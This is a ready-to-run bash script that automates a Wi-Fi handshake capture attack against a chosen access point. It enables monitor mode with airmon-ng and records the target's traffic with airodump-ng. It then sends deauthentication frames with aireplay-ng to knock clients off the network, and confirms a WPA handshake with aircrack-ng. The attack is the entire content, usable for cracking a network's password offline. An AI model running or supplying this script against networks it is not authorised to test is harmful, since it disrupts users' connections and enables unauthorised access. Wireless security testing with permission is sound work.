#!/bin/bash

set -e

if [ $# -lt 3 ]; then
  echo "Usage: $0 <wireless-interface> <bssid> <channel> [duration-seconds]"
  exit 1
fi

iface="$1"
bssid="$2"
channel="$3"
duration="${4:-30}"

if ! iw dev "$iface" info >/dev/null 2>&1; then
  echo "Error: Interface $iface not found or is not wireless."
  exit 1
fi

monitor_iface="$iface"
if ! iw dev "$iface" info 2>/dev/null | grep -q 'type monitor'; then
  sudo airmon-ng check kill >/dev/null 2>&1 || true
  sudo airmon-ng start "$iface" >/dev/null 2>&1 || true
  monitor_iface="${iface}mon"
fi

tmpdir=$(mktemp -d)
cap_base="$tmpdir/handshake"

sudo timeout "$duration" airodump-ng --bssid "$bssid" -c "$channel" --write "$cap_base" "$monitor_iface" >/dev/null 2>&1 &
dump_pid=$!

sleep 5
sudo aireplay-ng --deauth 10 -a "$bssid" "$monitor_iface" >/dev/null 2>&1 || true
wait "$dump_pid" || true

cap_file="${cap_base}-01.cap"

if [ -f "$cap_file" ]; then
  echo "Capture complete: $cap_file"
  echo "Checking for WPA handshake..."
  if sudo aircrack-ng "$cap_file" 2>&1 | grep -q 'WPA handshake'; then
    echo "Handshake successfully detected in capture."
  else
    echo "No WPA handshake detected in capture. Review the capture file and try again."
  fi
else
  echo "Error: handshake capture file was not created."
fi

if [ "$monitor_iface" != "$iface" ]; then
  sudo airmon-ng stop "$monitor_iface" >/dev/null 2>&1 || true
fi

echo "Capture directory: $tmpdir"
